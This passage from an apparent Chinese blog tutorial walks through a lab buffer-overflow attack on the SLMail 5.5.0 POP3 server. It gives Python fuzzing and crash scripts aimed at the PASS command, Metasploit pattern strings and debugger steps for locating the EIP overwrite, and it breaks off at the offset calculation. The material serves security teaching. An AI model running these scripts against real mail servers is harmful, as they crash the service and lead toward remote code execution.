href="#ImmunityDebugger-1-85-setup-exe的安装" class="headerlink" title="ImmunityDebugger_1_85_setup.exe的安装"></a>ImmunityDebugger_1_85_setup.exe的安装</h3><blockquote><p>直接点击安装包安装即可</p></blockquote><h3 id="mona-py-安装"><a href="#mona-py-安装" class="headerlink" title="mona.py 安装"></a>mona.py 安装</h3><blockquote><p>mona.py直接放在<em>ImmunityDebugger_1_85_setup.exe</em>安装路径下的<em>PyCommands</em>文件夹下</p></blockquote><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219204244390.png" alt="image-20221219204244390"></p><h2 id="FUZZER模糊测试"><a href="#FUZZER模糊测试" class="headerlink" title="FUZZER模糊测试"></a>FUZZER模糊测试</h2><blockquote><ul><li><p>整体思路：</p><ul><li>在提交数据的地方向程序发送各种字符组合，在服务器端使用Debuger调试程序，查看不同的数据被提交到110端口，被POP3服务解析，把数据放到内存中执行的过程是否会发生缓冲区溢出。</li></ul></li><li><p>FUZZ模糊测试</p><ul><li>所谓模糊测试，就是在未知的情形下一步一步的进行探测，例如在USER命令下加上100个参数没有溢出，再加1000个，或者再加10000个，最终若没有探测出USER命令存在缓冲区溢出的迹象的话，就换一下命令PASS进行测试，以此类推。</li></ul></li><li><p>SLMail 5.5.0 Mail Server</p><ul><li>ports：25 110 139 8376</li><li>POP3 PASS 命令存在缓冲区溢出漏洞</li><li>无需身份验证实现远程代码执行</li></ul></li><li><p>win7以上安全机制</p><ul><li>DEP：阻止代码从数据页被执行</li><li>ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化</li></ul></li></ul></blockquote><h3 id="测试端口连通性"><a href="#测试端口连通性" class="headerlink" title="测试端口连通性"></a>测试端口连通性</h3><blockquote><p>设置防火墙规则：开放25和110端口或者关闭防火墙</p></blockquote><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219205328532.png" alt="image-20221219205328532"></p><blockquote><p>如果想要研究这个邮件服务器是否存在漏洞，就需要向目标端口提交数据和输入指令的地方进行检测。</p></blockquote><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><blockquote><ul><li><p>由于在不清楚目标系统是否存在缓冲区溢出漏洞的情况下需要每一个命令加上大量数据检测一遍，通常需要使用脚本来执行</p></li><li><p>对于未知协议</p><ul><li><p>查询标准RFC了解此协议有什么指令，带什么参数，尝试探测缓冲区漏洞</p></li><li><p>wireshark抓包了解学习未知协议，再通过脚本进行探测</p></li></ul></li></ul></blockquote><p><strong>使用python2执行测试脚本</strong></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219224723974.png" alt="image-20221219224723974"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment">#-*-coding:utf-8-*-</span><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">try</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nSending evil buffer..."</span><span class="token punctuation">)</span>   s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"192.168.216.172"</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>               <span class="token comment">###将110端口返回的数据显示在屏幕中</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"USER test"</span><span class="token operator">+</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span>   data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"PASS test"</span><span class="token operator">+</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span>   data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token string">"\nDone"</span> <span class="token keyword">except</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Could not connect to POP3!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="FUZZING"><a href="#FUZZING" class="headerlink" title="FUZZING"></a>FUZZING</h3><blockquote><ul><li>测试PASS命令接收到大量数据时是否会溢出</li><li>EIP寄存器存放下一条指令的地址</li></ul></blockquote><ul><li>使用FUZZ脚本探测PASS指令是否存在缓冲区溢出</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> socket<span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"A"</span><span class="token punctuation">]</span>  <span class="token comment">#</span>counter <span class="token operator">=</span> <span class="token number">100</span>   <span class="token comment"># 计数</span><span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">50</span><span class="token punctuation">:</span>    <span class="token builtin">buffer</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span>counter<span class="token punctuation">)</span>  <span class="token comment"># 每次增加100个A</span>    counter <span class="token operator">=</span> counter<span class="token operator">+</span><span class="token number">200</span><span class="token keyword">for</span> string <span class="token keyword">in</span> <span class="token builtin">buffer</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Fuzzing PASS with %s bytes"</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    connect <span class="token operator">=</span> s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.216.172'</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'USER test'</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'PASS '</span><span class="token operator">+</span>string<span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>      s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'QUIT\r\n'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>执行脚本之前打开ImmunityDebugger调试工具，File-&gt;Attach监听110端口所在PID为560的进程</li></ul><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219232719070.png" alt="image-20221219232719070"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219231700980.png" alt="image-20221219231700980"></p><blockquote><p>左上的框是运行的汇编指令的窗口；右上的框寄存器窗口；左下的框是内存数据的窗口；右下的框其他相关的数据。</p><p>重点关注寄存器的窗口，寄存器数据交给CPU去执行。</p></blockquote><ul><li>此时右下角为Paused暂停状态，需要使进程运行起来</li></ul><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219231834392.png" alt="image-20221219231834392"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219231850768.png" alt="image-20221219231850768"></p><ul><li>执行脚本，发送数据</li></ul><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219232908324.png" alt="image-20221219232908324"></p><blockquote><p>数据发送到2900的时候已经暂停了</p></blockquote><ul><li>XP服务端进程已经暂停，重点关注EIP寄存器</li></ul><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219233416373.png" alt="image-20221219233416373"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219234541110.png" alt="image-20221219234541110"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221219234554079.png" alt="image-20221219234554079"></p><blockquote><p>由于寄存器的数据马上会交给CPU 去执行。首先我们需要关注的是寄存器里的EIP（EIP：寄存器存放下一条指令的地址），此时EIP内容为41414141，是16进制数，16进制的‘41’对应ASCII码中的‘A’，因此EIP寄存器被填满了A，而ESP、EBP都被填满了A，右下窗口里的数据也都是A。EIP寄存器存放下一条指令的地址，而此时EIP已经被缓冲区溢出的数据覆盖了原本真正的地址，下一跳指令就会跑到AAAA的地址上执行代码，而AAAA地址上不存在正确的程序代码，因此导致程序崩溃停止。</p><p>右下框存放内存地址中：从第一个地址01F79F20直到最后一个地址01F7A1AC都被‘A’填满；</p><p>此时程序已经崩溃，需要重新启动。</p></blockquote><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/ASCII.jpg" alt="ASCII"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote><p>思路：</p><p>EIP存放的是下一条指令的寄存器，若是可以修改下一条指令的位置，就可以修改程序运行的流程；假如下一条指令需要查询用户是否存在，就可以修改为执行一条系统命令，或者修改EIP中的地址将指令指向一个内存地址空间，这个内存地址空间中填满shellcode（后门程序），就可以完全控制目标服务器。</p></blockquote><h5 id="1、重新启动POP3，启动调试器并监听110端口"><a href="#1、重新启动POP3，启动调试器并监听110端口" class="headerlink" title="1、重新启动POP3，启动调试器并监听110端口"></a>1、重新启动POP3，启动调试器并监听110端口</h5><h5 id="2、重新编写脚本"><a href="#2、重新编写脚本" class="headerlink" title="2、重新编写脚本"></a>2、重新编写脚本</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">2700</span>  <span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nSending evil buffer..."</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.216.172'</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'USER test'</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'PASS '</span><span class="token operator">+</span><span class="token builtin">buffer</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nDone!"</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Could not connect to POP3"</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''测试时数据在2700左右实现了EIP寄存器溢出；若是2700没有溢出，就变成2900/3100，需要精确的定位到这覆盖EIP寄存器的这4个字节到底是第多少个，只有精确了第多少个字符，再去修改脚本，添加下一条指令，达到修改程序运行流程的目的。'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3、测试溢出数据"><a href="#3、测试溢出数据" class="headerlink" title="3、测试溢出数据"></a>3、测试溢出数据</h5><p>发送2700个A时程序已经崩溃</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220001925184.png" alt="image-20221220001925184"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220001936832.png" alt="image-20221220001936832"></p><p>修改数据为2600测试，若2600个A没有溢出，说明修改了EIP寄存器中的4个字节的A就在2600-2700之间，具体是多少，需要进一步测试</p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220002629643.png" alt="image-20221220002629643"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220002613106.png" alt="image-20221220002613106"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220003950164.png" alt="image-20221220003950164"></p><blockquote><p>此时程序已经挂掉，但服务还在运行，此时的EIP地址没有被‘A’填满，地址不是41414141；是未知的地址65746174；</p><p>说明了溢出的部分就在2600-2700之间，接下来就要确定是具体什么位置导致EIP寄存器被修改，才能重定向程序运行流程。</p></blockquote><h5 id="4、寻找具体位置"><a href="#4、寻找具体位置" class="headerlink" title="4、寻找具体位置"></a>4、寻找具体位置</h5><blockquote><ul><li>二分法：通过不断取中间值找到最终结果。</li><li>唯一字符串法：通过发送2700个唯一字符，其中每四个字符为一组，每一组字符的内容都不相同，都是唯一的，此时我们就只需要看被填充到EIP里的是哪四个字符串就可以立马定位到是第几个位置的字符串被填充到EIP中，然后就可以对EIP中的数值进行精确的修改。</li></ul></blockquote><h5 id="5、唯一字符串法"><a href="#5、唯一字符串法" class="headerlink" title="5、唯一字符串法"></a>5、唯一字符串法</h5><blockquote><p>使用msf现成的脚本发送2700个唯一的字符</p></blockquote><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit.&#x2F;pattern_create.rb -l 2700<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>首先进入到msf相应目录，运行pattern_create.rb脚本生成2700个唯一字符串，生成的每3个字符为一组的2700组的唯一字符串。</p></blockquote><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220004333504.png" alt="image-20221220004333504"></p><h5 id="6、将生成的字符串填入到脚本中"><a href="#6、将生成的字符串填入到脚本中" class="headerlink" title="6、将生成的字符串填入到脚本中"></a>6、将生成的字符串填入到脚本中</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nSending evil buffer..."</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.216.172'</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'USER test'</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'PASS '</span><span class="token operator">+</span><span class="token builtin">buffer</span><span class="token operator">+</span><span class="token string">'\r\n'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nDone!"</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Could not connect to POP3"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="7、发送新数据"><a href="#7、发送新数据" class="headerlink" title="7、发送新数据"></a>7、发送新数据</h5><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220005120761.png" alt="image-20221220005120761"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220005140329.png" alt="image-20221220005140329"></p><blockquote><p>得到地址39 69 44 38，此时就是EIP寄存器溢出的4个字节；</p><p>内存地址与平常书写的地址是相反的：内存低地址放在高位；内存高地址放在低位</p><p>调整顺序：38 44 69 39</p></blockquote><h5 id="8、查ASCII码表进行转换"><a href="#8、查ASCII码表进行转换" class="headerlink" title="8、查ASCII码表进行转换"></a>8、查ASCII码表进行转换</h5><blockquote><p>38—&gt;8</p><p>44—&gt;D</p><p>69—&gt;i</p><p>39—&gt;9</p></blockquote><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220005740248.png" alt="image-20221220005740248"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220005807823.png" alt="image-20221220005807823"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220005829527.png" alt="image-20221220005829527"></p><p><img src="/2022/12/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E3%80%90Windows%E3%80%91/image-20221220005846829.png" alt="image-20221220005846829"></p><h5 id="9、计算偏移量"><a href="#9、计算偏移量" class="headerlink" title="9、计算偏移量"></a>9、计算偏移量</h5><p>利用msf下的pattern_offset.rb可以计算39694438所在2700个字符串中的偏移量</p><p><img 